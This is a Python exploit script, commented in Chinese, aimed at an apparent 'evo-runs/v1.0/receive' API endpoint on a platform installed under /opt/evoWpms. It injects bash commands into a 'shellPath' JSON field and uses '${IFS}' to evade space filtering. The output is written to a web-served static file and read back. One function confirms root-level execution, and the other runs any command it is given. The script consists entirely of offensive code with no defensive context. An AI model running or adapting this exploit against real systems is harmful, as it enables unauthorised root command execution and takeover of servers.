import httpx
import random
import string
import time
#pip install httpx[http2]


def _verify(target):
    """验证漏洞是否存在"""
    url = target["target"]
    verify_file = '09d5835.css'
    cmd = f"id>/opt/evoWpms/static/{verify_file}"
    cmd = cmd.replace(' ', '${IFS}')

    payload = {
        "method": "agent.ossm.mapping.config",
        "info": {
            "configure": "abcd",
            "filePath": "haha",
            "paramMap": {
                # "shellPath": f"/bin/bash -c {cmd}",  # ok
                "shellPath": f"/bin/bash -c '{cmd}'",
                "filePath": "abc"
            },
            "requestIp": ""
        }
    }

    api_url = f"{url}/evo-runs/v1.0/receive"
    headers = {"X-Subject-Headerflag": "ADAPT"}

    # 启用 HTTP/2
    with httpx.Client(http2=True, verify=False, timeout=10) as client:
        try:
            print(payload)
            resp = client.post(api_url, json=payload, headers=headers)
            print(resp.text)

            if resp.status_code == 200:
                time.sleep(2)
                check_url = f"{url}/static/{verify_file}"
                print(check_url)

                check_resp = client.get(check_url)
                print(check_resp.text)

                if check_resp.status_code == 200 and "(root)" in check_resp.text:
                    return {
                        "target": url,
                        "result": f"命令执行成功，验证文件{verify_file}内容：{check_resp.text[:200]}"
                    }
        except Exception:
            import traceback
            traceback.print_exc()

    return None


def _cmd_exc(target, cmd):
    """执行任意命令"""
    url = target["target"]
    out_file = ''.join(random.choices(string.ascii_lowercase, k=5)) + '.txt'
    full_cmd = f"{cmd} > /opt/evoWpms/static/{out_file}"
    full_cmd = full_cmd.replace(' ', '${IFS}')

    payload = {
        "method": "agent.ossm.mapping.config",
        "info": {
            "configure": "abcd",
            "filePath": "haha",
            "paramMap": {
                "shellPath": f"/bin/bash -c '{full_cmd}'",
                "filePath": "abc"
            },
            "requestIp": ""
        }
    }

    api_url = f"{url}/evo-runs/v1.0/receive"

    with httpx.Client(http2=True, verify=False, timeout=10) as client:
        try:
            resp = client.post(api_url, json=payload)
            if resp.status_code == 200:
                check_url = f"{url}/static/{out_file}"
                check_resp = client.get(check_url)

                if check_resp.status_code == 200:
                    return {
                        "target": url,
                        "result": f"命令执行结果：{check_resp.text[:500]}"
                    }
                else:
                    return {
                        "target": url,
                        "result": "命令可能已执行，但无法读取输出文件"
                    }
        except Exception as e:
            return {
                "target": url,
                "result": f"请求异常：{str(e)}"
            }

    return None


if __name__ == "__main__":
    _verify("http://example.com")